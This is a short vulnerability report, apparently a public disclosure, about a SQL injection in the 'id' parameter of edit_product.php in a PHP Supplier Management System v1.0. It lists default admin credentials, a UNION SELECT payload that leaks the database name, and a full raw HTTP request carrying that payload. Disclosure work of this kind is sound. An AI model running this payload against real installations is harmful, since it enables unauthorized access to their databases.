# Supplier Management System v1.0 has SQL injection

BUG_AUTHOR: lixiaoning

The password for the backend login account is: admin/admin123

vendors: https://www.campcodes.com/projects/php/supplier-management-system-using-php-mysql/

Vulnerability File: /Supply_Management_System/admin/edit_product.php?id=

Vulnerability location: /Supply_Management_System/admin/edit_product.php, id

Current database name: sourcecodester_scm_new

[+] Payload: /Supply_Management_System/admin/edit_product.php?id=-1' union select 1,database(),3,4,5,6,7--+ // Leak place ---> id

```sql
GET /Supply_Management_System/admin/edit_product.php?id=-1%27%20union%20select%201,database(),3,4,5,6,7--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=eaps2u9ukno946luh75h1m2lak
Connection: close
```

![image](https://github.com/user-attachments/assets/d3c1f61e-ca37-4efa-ac17-460fe1d1c6ff)
